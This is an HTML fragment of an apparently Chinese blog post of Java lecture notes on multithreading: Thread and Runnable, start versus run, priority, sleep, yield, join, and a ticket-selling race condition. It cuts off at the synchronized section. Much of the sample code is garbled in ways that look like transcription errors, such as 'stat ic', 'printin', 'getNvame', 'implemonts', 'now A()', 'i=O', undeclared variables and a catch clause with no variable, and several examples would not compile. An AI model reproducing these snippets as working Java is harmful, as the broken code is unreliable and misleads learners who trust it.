</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showArray</span><span class="params">(<span class="keyword">int</span> [] dat a)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> e : data)</span><br><span class="line">			System.out.printf(<span class="string">&quot;%d\t&quot;</span>, e);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Java-6线程"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/04/15/Java-6%E7%BA%BF%E7%A8%8B/"
    >Java 6线程</a> 
</h2>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/04/15/Java-6%E7%BA%BF%E7%A8%8B/" class="article-date">
  <time datetime="2021-04-15T06:09:48.000Z" itemprop="datePublished">2021-04-15</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Java/">Java</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><h2 id="什么叫程序"><a href="#什么叫程序" class="headerlink" title="什么叫程序"></a>什么叫程序</h2><p>​    所谓“程序”，是一个严格有序的指令集合。程序规定了完成某一任务时；计算机所需做的各种操作，以及这些操作的执行顺序。</p>
<h1 id="单道程序设计环境中程序特点"><a href="#单道程序设计环境中程序特点" class="headerlink" title="单道程序设计环境中程序特点"></a>单道程序设计环境中程序特点</h1><ul>
<li>单道程序设计环境是指：</li>
</ul>
<p>​        计算机中除了操作系统之外，只存在一个用户程序，即用户程序独享整个计算机资源</p>
<ul>
<li>单道程序有如下特点：<ul>
<li>资源的独占性:<ul>
<li>任何时候，位于内存中的程序可以使用系统中的一切资源,不可能有其他程序与之竞争。</li>
</ul>
</li>
<li>执行的顺序性:<ul>
<li>内存中每次只有一个程序，各个程序是按次序执行的，即做完一个，再做下一个。<br>绝对不可能出现在一个程序运行过程中，又夹杂进另一个程序执行的现象存在</li>
</ul>
</li>
<li>结果的再现性:<ul>
<li>只要执行环境和初始条件相同，重复执行一个程序，获得的结果总是一样的。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="多道程序设计环境中程序特点"><a href="#多道程序设计环境中程序特点" class="headerlink" title="多道程序设计环境中程序特点"></a>多道程序设计环境中程序特点</h1><p>多道程序设计是指：</p>
<p>​    计算机中除了操作系统之外，存在多个用户程底，这些程序同时运行</p>
<p>多道程序设计有如下特点：</p>
<ul>
<li>间断性：<ul>
<li>由于资源共享和合作，并发程序间相互制约，造成合作执行间断。</li>
</ul>
</li>
<li>失去封闭性：<ul>
<li>程序执行受外界影响。</li>
</ul>
</li>
<li>不可再现性：<ul>
<li>重复执行时，可能得到不同结果。</li>
</ul>
</li>
</ul>
<h1 id="进程的由来"><a href="#进程的由来" class="headerlink" title="进程的由来"></a>进程的由来</h1><p>​    一方面为了保持程序“是一个在时间上严格有序的指令集合,是静态的保存在存储介质上”这个概念的原有含义，另一方面为了刻画多个程序共同运行时呈现出的这些特征，在操作系统中，以“程序”为基础，又引入了“进程”这一新的概念!</p>
<p>​    通俗点说，<strong>为了不破坏“程序”这个词原有的含义，而又能刻画多个程序共同运行时呈现出的新特征，所以引入了进程这一概念</strong>，按照大多数教材的说法:“为了使程序能并发执行，且为了对并发执行的程序加以描述，所以人们引入了进程”</p>
<h1 id="初学者要注意四个问题"><a href="#初学者要注意四个问题" class="headerlink" title="初学者要注意四个问题"></a>初学者要注意四个问题</h1><ul>
<li>什么是进程(尽量理解)</li>
<li>为什么需要进程(理解)</li>
<li>什么是线程(必须掌握)</li>
<li>为什么需要线程(不知道也没关系)</li>
</ul>
<p><strong>多线程程序在不同的路径执行，交替同时执行</strong></p>
<h1 id="线程的定义"><a href="#线程的定义" class="headerlink" title="线程的定义"></a>线程的定义</h1><ul>
<li><strong>线程是一个程序里的不同执行路径</strong></li>
<li>以前所编写的程序，每个程序都有一个入口、一个出口以及一个顺序执行的序列，在程序执行过程中的任何指定时刻，都只有一个单独的执行点。</li>
<li>事实上，在单个程序内部是可以在同一时刻进行多种运算的，这就是所谓的多线程</li>
<li>程序、进程、线程的异同参见操作系统，这些并不影响我们对Java的学习</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">			System.out.println(<span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="title">Thread_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> stat ic <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        aa = <span class="keyword">new</span> A();</span><br><span class="line">		aa.start(); <span class="comment">//aa. start(); 会自动调用run方法</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			System.out.println(<span class="string">&quot;BBBB&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>单写aa.run跟普通调用函数一样</p>
<p><strong>start()的功能是</strong></p>
<p>​    1.开启一个新线程</p>
<p>​    2.执行线程，run的代码</p>
<p>A类继承了Thread，重写了run方法</p>
<p><strong>注意：要用调用run方法，写start()</strong></p>
<h1 id="多线程的优势"><a href="#多线程的优势" class="headerlink" title="多线程的优势"></a>多线程的优势</h1><p>多线程编程简单，效率高（能直接共享数据和资源，多进程不能</p>
<p>适合于开发服务程序（如Web服务，聊天服务等)</p>
<h1 id="创建一个线程的第一种方法"><a href="#创建一个线程的第一种方法" class="headerlink" title="创建一个线程的第一种方法"></a>创建一个线程的第一种方法</h1><ol>
<li>创建一个继承Thread的类(假定类名为A)，并重写Thread中的run方法</li>
<li>构造一个A类对象,假定对象名为aa</li>
<li>调用aa的start方法【start方法是从Thread继承过来的】</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadDef1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		A aa = <span class="keyword">new</span> A(); <span class="comment">//构造一个A类对象</span></span><br><span class="line">		aa.start(); <span class="comment">//调用aa的start方法, start方法会创建一个新的线程，并自动调用aa对象的run()方法</span></span><br><span class="line">        </span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">			System.out.println(<span class="string">&quot;BBBBBBBB&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">Thread</span> //创建一个继承<span class="title">Thread</span>的类</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="comment">//重写Thread中的run方法</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">			System.out.printin(<span class="string">&quot;AAAAAA&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="注意问题"><a href="#注意问题" class="headerlink" title="注意问题"></a>注意问题</h2><ul>
<li>Thread中<code>start()</code>方法的功能就是创建一个新的线程，<strong>并自动调用该线程的run()方法</strong>，直接调用run()方法是不会创建一个新的线程的</li>
<li>执行一个线程实际就是执行该线程run方法中的代码</li>
<li>执行完aa.start();后并不表示aa所对应的线程就一定会立即得到了执行，aa.start();执行完后只是表示aa线程具有了可以立即被CPU执行的资格，但由于想抢占CPU执行的线程很多，CPU并不一定会立即去执行aa所对应的线程</li>
<li>一个Thread对象能且只能代表一个线程，<strong>一个Thread对象不能调用两次start()方法</strong>，否则会抛出<code>java.lang.lllegalThreadStateException</code>异常</li>
</ul>
<p>操作系统控制的标准</p>
<ol>
<li><p>优先级</p>
</li>
<li><p>时间的长短</p>
</li>
<li><p>最长等待时间</p>
</li>
<li><p>紧急程度</p>
</li>
</ol>
<h1 id="线程状态的切换"><a href="#线程状态的切换" class="headerlink" title="线程状态的切换"></a>线程状态的切换</h1><p><img src="/2021/04/15/Java-6%E7%BA%BF%E7%A8%8B/%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81%E7%9A%84%E5%88%87%E6%8D%A2.png" alt="创建一个新线程的第二种方法"></p>
<p>​    执行完 aa.start(); 后并不表示 aa 所对象的线程就一定会立即得到了执行，aa.start(); 执行完后只是表示 t 线程具有了可以立即被CPU执行的资格，但由于想抢占CPU执行的线程很多，CPU并不一定会立即去执行t所对应的线程</p>
<h1 id="创建一个新线程的第二种方法"><a href="#创建一个新线程的第二种方法" class="headerlink" title="创建一个新线程的第二种方法"></a>创建一个新线程的第二种方法</h1><ol>
<li><p>定义一个实现了<code>Runnable</code>接口的类，假定为A</p>
</li>
<li><p>创建A类对象aa,代码如下<br>   <code>A aa = new A</code></p>
</li>
<li><p>利用aa构造一个<code>Thread</code>对象tt,<br>  <code>Thread tt = new Thread(aa);</code></p>
</li>
<li><p>调用tt中的start方法</p>
<p>  <code>tt.start();</code></p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        	System.out.println(<span class="string">&quot;AAAA\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThread_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		aa = <span class="keyword">new</span> A():</span><br><span class="line">		<span class="comment">//aa.start(); //error</span></span><br><span class="line">        Thread t = <span class="keyword">new</span> Thread(aa);</span><br><span class="line">        t.start();</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			System.out.println(<span class="string">&quot;BBBB\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="线程常用方法的介绍"><a href="#线程常用方法的介绍" class="headerlink" title="线程常用方法的介绍"></a>线程常用方法的介绍</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span>  </span></span><br><span class="line"><span class="function">    设置当前线程的名字</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Thread <span class="title">currentThread</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    返回对当前正在执行的线程对象的引用。</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    返回当前线程的名字</span></span><br></pre></td></tr></table></figure>

<p><strong>线程之间的执行顺序是不确定的</strong></p>
<h1 id="线程的控制"><a href="#线程的控制" class="headerlink" title="线程的控制"></a>线程的控制</h1><h2 id="线程控制的基本方法"><a href="#线程控制的基本方法" class="headerlink" title="线程控制的基本方法"></a>线程控制的基本方法</h2><table>
<thead>
<tr>
<th>方法</th>
<th align="left">功能</th>
</tr>
</thead>
<tbody><tr>
<td>isAlive()</td>
<td align="left">判断线程是否还”活“着，即线程是否还未终止。</td>
</tr>
<tr>
<td>getPriority()</td>
<td align="left">获得线程的优先级数值</td>
</tr>
<tr>
<td>setPriority()</td>
<td align="left">设置线程的优先级数值</td>
</tr>
<tr>
<td>Thread.sleep()</td>
<td align="left">将当前线程睡眠指定毫秒数</td>
</tr>
<tr>
<td>join()</td>
<td align="left">调用某线程的该方法,将当前线程与该线程”合并”，即等待该线程结束,再恢复当前线程的运行。</td>
</tr>
<tr>
<td>yield()</td>
<td align="left">让出CPU，当前线程进入就绪队列等待调度。</td>
</tr>
<tr>
<td>wait()</td>
<td align="left">当前线程进入对象的wait pool。</td>
</tr>
<tr>
<td>notify() <br>notifyAll()</td>
<td align="left">唤醒对象的wait poo1中的一个<br>所有等待线程。</td>
</tr>
</tbody></table>
<p><strong><code>sleep()</code>是堵塞，<code>yield()</code>是就绪</strong></p>
<h1 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h1><ul>
<li>线程的优先级用数字来表示，范围从1到10，数值越高等级越高</li>
<li>主线程的缺省优先级是5，子线程的优先级默认与其父线程相同</li>
<li>Java提供一个线程调度器来监控程序中启动后进入就绪状态的所有线程线程调度器按照线程的优先级决定应调度哪个线程来执行。</li>
<li>线程的优先级用数字表示，范围从1到10，一个线程的缺省优先级是5。◇<br>◇<code>Thread.MIN_PRIORITY=1</code><br>◇<code>Thread.MAX_PRIORITY=10</code><br>◇<code>Thread.NORM_PRIORITY=5</code></li>
<li>使用下述线方法获得或设置线程对象的优先级。<br>◇<code>int getPriority();</code><br>◇<code>void setPriority(int newPriority);</code></li>
<li>通常高优先级的线程将先于优先级低的线程执行，但并不总是这样，因此<strong>实际开发中并不单纯依赖优先级来决定线程运行次序</strong></li>
<li>相等交替执行（内部有时间片轮转）</li>
</ul>
<h1 id="线程的休眠"><a href="#线程的休眠" class="headerlink" title="线程的休眠"></a>线程的休眠</h1><ul>
<li><p>线程休眠——暂停执行当前运行中的线程，使之进入阻塞状态，待经过指定的“延迟时间”后再醒来并转入到就绪状态。</p>
</li>
<li><p><code>Thread</code>类提供的相关方法:<br> public static void sleep(long millis)<br> public static void sleep(long millis, int nanos)</p>
</li>
<li><p>由于是静态方法，可以由Thread直接调用</p>
</li>
<li><p><strong>sleep()方法会抛出<code>InterruptedException</code>异常，我们必须得对其进行捕捉</strong></p>
<p>示例</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestSleep</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        A aa = <span class="keyword">new</span> A();</span><br><span class="line">		Thread tt = <span class="keyword">new</span> Thread(aa);</span><br><span class="line">        tt.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="comment">//9行</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">        	System.out.println(Thread.currentThread().getNvame() + <span class="string">&quot; &quot;</span>+ i);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>); </span><br><span class="line">                <span class="comment">//这里的Thread.sleep(1000)会抛出异常必须的进行捕捉，不能在9的后面添加throws Exception</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="无论是继承Thread类的run方法还是实现Runnable接口的run方法，都不能抛出任何异常"><a href="#无论是继承Thread类的run方法还是实现Runnable接口的run方法，都不能抛出任何异常" class="headerlink" title="无论是继承Thread类的run方法还是实现Runnable接口的run方法，都不能抛出任何异常"></a>无论是继承Thread类的run方法还是实现Runnable接口的run方法，都不能抛出任何异常</h1><p><code>**Runnable</code>（父类）没有抛异常，所以A（子类）不能抛异常**</p>
<p><strong>run方法处理异常要写tey，不能抛出</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="comment">//throws Exception //注释符不能去掉，否则编译会报错</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">Thread</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> <span class="comment">//throws Exception //注释符不能去掉，否则编译会报错</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>原因:</strong><br>    <strong>重写方法抛出异常的范围不能大于被重写法排除的异常范围</strong></p>
<h1 id="线程的让步"><a href="#线程的让步" class="headerlink" title="线程的让步"></a>线程的让步</h1><ul>
<li>让出CPU，给其他线程执行的机会</li>
<li>让运行中的线程主动放弃当前获得的CPU处理机会，但不是使该线程阻塞,而是使之转入就绪状态。<br>  <code>public static void yield()</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestJoin</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        MyRunner r = <span class="keyword">new</span> MyRunner();</span><br><span class="line">        Thread t = <span class="keyword">new</span> Thread(r);</span><br><span class="line">        t.start();</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">        	t.join(); <span class="comment">//7行</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InterruptedException)</span><br><span class="line">        &#123;</span><br><span class="line">        	e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">50</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">        	System.out.println(<span class="string">&quot;主线程:&quot;</span> + i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyRunner</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=O;i&lt;<span class="number">50</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">			System.out.println(<span class="string">&quot;子线程:&quot;</span> +i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    7行的t.join();暂停当前正在执行t.join();的线程,直到t所对应的线程运行终止之后,当前线程才会获得继续执行的机会</p>
<p><strong>注意: t.join()不是暂停t对象所对应的线程</strong></p>
<h1 id="线程的同步"><a href="#线程的同步" class="headerlink" title="线程的同步"></a>线程的同步</h1><h2 id="买票程序"><a href="#买票程序" class="headerlink" title="买票程序"></a>买票程序</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="title">implemonts</span> <span class="title">Runnable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> tickets = <span class="number">100</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (ticket s &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">				System.out.printf(<span class="string">&quot;%s线程正在卖出第%d张票\n&quot;</span>,Thread.currentThread().getName(),tickets);</span><br><span class="line">    			--tickets;</span><br><span class="line">        	&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestTickets</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		aal = <span class="function">now <span class="title">A</span><span class="params">()</span></span>;</span><br><span class="line">		Thread t1 = <span class="keyword">new</span> Thread (aa1);</span><br><span class="line">        t1.start();</span><br><span class="line">        </span><br><span class="line">		A aa2 = <span class="keyword">new</span> A();</span><br><span class="line">		Thread t2= <span class="function">now <span class="title">Thread</span><span class="params">(aa2)</span></span>;</span><br><span class="line">        t2.start();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//正确</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        aa = now A();</span></span><br><span class="line"><span class="comment">        Thread t1= now Thread(aa);</span></span><br><span class="line"><span class="comment">        t1.start();</span></span><br><span class="line"><span class="comment">        </span></span><br><span class="line"><span class="comment">        Thread t2= now Thread(aa);</span></span><br><span class="line"><span class="comment">        t2.start();</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这不是两个线程买100张，是两个程序个卖个的</p>
<p>出现同一张票卖多次原因</p>
<p>1.处理相同资源</p>
<p>2.关键步骤不是互斥的</p>
<h2 id="Synchronized关键字"><a href="#Synchronized关键字" class="headerlink" title="Synchronized关键字"></a>Synchronized关键字</h2><ul>
<li><strong>synchronized可以用来修饰</strong><ul>
<li><strong>一个方法</strong></li>
<li><strong>一个方法内部的某个代码块</strong></li>
</ul>
</li>
</ul>
<h4 id="修饰代码块"><a href="#修饰代码块" class="headerlink" title="修饰代码块"></a>修饰代码块</h4><p>格式：</p>
